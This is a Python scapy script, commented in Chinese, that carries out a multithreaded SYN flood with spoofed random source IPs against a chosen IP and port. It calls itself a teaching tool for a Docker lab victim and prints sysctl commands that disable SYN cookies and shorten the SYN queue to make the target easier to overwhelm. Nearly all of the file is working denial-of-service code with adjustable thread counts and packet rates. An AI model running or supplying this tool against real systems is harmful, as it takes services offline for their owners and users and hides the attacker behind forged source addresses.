import sys
import threading
import time
import subprocess
import os
from scapy.all import *

def adjust_victim_tcp_params(target_ip, make_vulnerable=True):
    """
    调整目标系统的TCP参数以增强攻击效果（教学用途）
    这需要在受害者容器中执行，或通过SSH等方式
    """
    print(f"{'=' * 60}")
    if make_vulnerable:
        print("🎯 调整TCP参数以增强SYN攻击效果")
        print("   - 缩短SYN队列长度")
        print("   - 延长SYN+ACK重试时间")
        print("   - 关闭SYN Cookies防护")
    else:
        print("🛡️  恢复TCP参数到安全配置")
    print(f"{'=' * 60}")
    
    if make_vulnerable:
        # 使系统更容易受到SYN攻击的参数
        vulnerable_params = {
            'net.ipv4.tcp_max_syn_backlog': '128',      # 缩短SYN队列（默认通常是1024+）
            'net.ipv4.tcp_synack_retries': '6',         # 延长SYN+ACK重试次数（增加等待时间）
            'net.ipv4.tcp_syn_retries': '6',            # 延长SYN重试次数
            'net.ipv4.tcp_syncookies': '0',             # 关闭SYN Cookies防护
            'net.ipv4.tcp_abort_on_overflow': '1',      # 队列满时拒绝连接
        }
        print("📋 应用易受攻击的TCP参数:")
    else:
        # 恢复到默认参数（更真实）
        vulnerable_params = {
            'net.ipv4.tcp_max_syn_backlog': '1024',     # 系统默认SYN队列
            'net.ipv4.tcp_synack_retries': '5',         # 系统默认重试次数
            'net.ipv4.tcp_syn_retries': '6',            # 系统默认重试次数
            'net.ipv4.tcp_syncookies': '1',             # 开启SYN Cookies防护
            'net.ipv4.tcp_abort_on_overflow': '0',      # 系统默认处理方式
        }
        print("📋 恢复系统默认TCP参数:")
    
    # 生成sysctl命令
    commands = []
    for param, value in vulnerable_params.items():
        commands.append(f"sysctl -w {param}={value}")
        print(f"   {param} = {value}")
    
    print(f"\n💡 在受害者系统({target_ip})上执行以下命令:")
    if make_vulnerable:
        print("   docker exec -it victim bash")
        print("   ./setup_victim.sh vulnerable")
    else:
        print("   docker exec -it victim bash")
        print("   ./setup_victim.sh default    # 恢复系统默认")
        print("   # 或者")
        print("   ./setup_victim.sh secure     # 应用增强防护")
    print()
    
    return commands

def syn_flood_thread(target_ip, target_port, thread_id, packets_per_second=1000):
    """
    单线程SYN Flood攻击
    """
    print(f"Thread {thread_id} starting SYN Flood on {target_ip}:{target_port}...")
    packet_count = 0
    start_time = time.time()
    
    while True:
        try:
            # 批量发送数据包以提高效率
            packets = []
            for _ in range(10):  # 每次批量发送10个包
                # 构造IP层，源IP随机伪造 (DDoS的关键特征)
                ip_layer = IP(src=RandIP(), dst=target_ip)
                # 构造TCP层，目标端口为指定端口，标志位为SYN
                tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
                # 组合成完整的数据包
                packet = ip_layer / tcp_layer
                packets.append(packet)
            
            # 批量发送数据包
            send(packets, verbose=0)
            packet_count += len(packets)
            
            # 控制发送速率
            elapsed = time.time() - start_time
            expected_packets = int(elapsed * packets_per_second)
            if packet_count > expected_packets:
                time.sleep(0.001)  # 稍微延迟
                
            # 每1000个包打印一次统计
            if packet_count % 1000 == 0:
                rate = packet_count / elapsed
                print(f"Thread {thread_id}: Sent {packet_count} packets, Rate: {rate:.1f} pps")
                
        except KeyboardInterrupt:
            print(f"Thread {thread_id} SYN Flood stopped.")
            break
        except Exception as e:
            print(f"Thread {thread_id} error: {e}")
            time.sleep(0.1)

def enhanced_syn_flood_thread(target_ip, target_port, thread_id, packets_per_second=2000):
    """
    增强版SYN Flood攻击线程 - 针对缩短的队列优化
    """
    print(f"🚀 Thread {thread_id} starting Enhanced SYN Flood on {target_ip}:{target_port}...")
    packet_count = 0
    start_time = time.time()
    
    # 预生成一些随机源IP池，提高效率
    source_ips = [str(RandIP()) for _ in range(100)]
    source_ports = [RandShort()._fix() for _ in range(100)]
    
    while True:
        try:
            # 增大批量发送数量，快速填满缩短的队列
            packets = []
            for i in range(20):  # 每次批量发送20个包（比原来多）
                # 使用预生成的随机IP和端口，提高效率
                src_ip = source_ips[i % len(source_ips)]
                src_port = source_ports[i % len(source_ports)]
                
                # 构造IP层，源IP随机伪造
                ip_layer = IP(src=src_ip, dst=target_ip)
                # 构造TCP层，使用随机源端口和SYN标志
                tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=RandInt())
                # 组合成完整的数据包
                packet = ip_layer / tcp_layer
                packets.append(packet)
            
            # 批量发送数据包，不等待响应
            send(packets, verbose=0, inter=0)
            packet_count += len(packets)
            
            # 更精确的速率控制
            elapsed = time.time() - start_time
            if elapsed > 0:
                current_rate = packet_count / elapsed
                if current_rate > packets_per_second:
                    time.sleep(0.0005)  # 微调延迟
                
            # 每2000个包打印一次统计
            if packet_count % 2000 == 0:
                rate = packet_count / elapsed if elapsed > 0 else 0
                print(f"🎯 Thread {thread_id}: Sent {packet_count} packets, Rate: {rate:.1f} pps")
                
        except KeyboardInterrupt:
            print(f"❌ Thread {thread_id} SYN Flood stopped.")
            break
        except Exception as e:
            print(f"⚠️  Thread {thread_id} error: {e}")
            time.sleep(0.01)

def syn_flood(target_ip, target_port, num_threads=8, packets_per_second=2000, adjust_params=True):
    """
    增强版多线程SYN Flood攻击
    :param target_ip: 目标IP
    :param target_port: 目标端口
    :param num_threads: 线程数量
    :param packets_per_second: 每秒发包数（每线程）
    :param adjust_params: 是否显示参数调整建议
    """
    print(f"🎯 启动增强版SYN Flood攻击: {target_ip}:{target_port}")
    print(f"📊 攻击参数: {num_threads} 线程, 每线程 {packets_per_second} pps")
    print(f"📈 预期总速率: {num_threads * packets_per_second} pps")
    print()
    
    if adjust_params:
        # 显示TCP参数调整建议
        adjust_victim_tcp_params(target_ip, make_vulnerable=True)
        
        print("⏳ 等待5秒，给您时间调整受害者系统参数...")
        for i in range(5, 0, -1):
            print(f"   {i}秒后开始攻击...")
            time.sleep(1)
        print()
    
    threads = []
    try:
        print("🚀 启动攻击线程...")
        # 启动多个攻击线程
        for i in range(num_threads):
            thread = threading.Thread(
                target=enhanced_syn_flood_thread, 
                args=(target_ip, target_port, i+1, packets_per_second)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.05)  # 稍微错开启动时间
        
        print(f"✅ {num_threads} 个攻击线程已启动")
        print("📝 攻击进行中... 按 Ctrl+C 停止攻击")
        print()
        
        # 等待所有线程完成
        for thread in threads:
            thread.join()
            
    except KeyboardInterrupt:
        print("\n🛑 正在停止所有攻击线程...")
        print("💡 建议恢复受害者系统的TCP参数:")
        adjust_victim_tcp_params(target_ip, make_vulnerable=False)
        # 线程会通过daemon=True自动停止

def show_usage():
    """显示使用说明"""
    print("🎯 SYN Flood 攻击工具 (教学版)")
    print("=" * 50)
    print("用法:")
    print("  python3 attack.py <Target_IP> <Target_Port> [options]")
    print()
    print("参数:")
    print("  Target_IP     目标IP地址")
    print("  Target_Port   目标端口")
    print("  --threads     攻击线程数 (默认: 8)")
    print("  --pps         每线程每秒包数 (默认: 2000)")
    print("  --no-adjust   不显示TCP参数调整建议")
    print("  --legacy      使用原版攻击模式")
    print()
    print("示例:")
    print("  python3 attack.py 10.10.20.20 80")
    print("  python3 attack.py 10.10.20.20 80 --threads 12 --pps 3000")
    print("  python3 attack.py 10.10.20.20 80 --legacy --threads 5 --pps 1000")
    print()
    print("教学说明:")
    print("  此工具会建议调整受害者系统的TCP参数以演示SYN攻击原理")
    print("  请确保在合法的测试环境中使用")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        show_usage()
        sys.exit(1)
    
    # 解析命令行参数
    victim_ip = sys.argv[1]
    victim_port = int(sys.argv[2])
    
    # 默认参数
    num_threads = 8
    pps_per_thread = 2000
    adjust_params = True
    use_legacy = False
    
    # 解析可选参数
    i = 3
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg == "--threads" and i + 1 < len(sys.argv):
            num_threads = int(sys.argv[i + 1])
            i += 2
        elif arg == "--pps" and i + 1 < len(sys.argv):
            pps_per_thread = int(sys.argv[i + 1])
            i += 2
        elif arg == "--no-adjust":
            adjust_params = False
            i += 1
        elif arg == "--legacy":
            use_legacy = True
            i += 1
        else:
            # 兼容旧版本参数格式
            if i == 3:
                num_threads = int(arg)
            elif i == 4:
                pps_per_thread = int(arg)
            i += 1
    
    # 启动攻击
    if use_legacy:
        print("🔄 使用原版攻击模式")
        syn_flood_thread(victim_ip, victim_port, 1, pps_per_thread)
    else:
        syn_flood(victim_ip, victim_port, num_threads, pps_per_thread, adjust_params)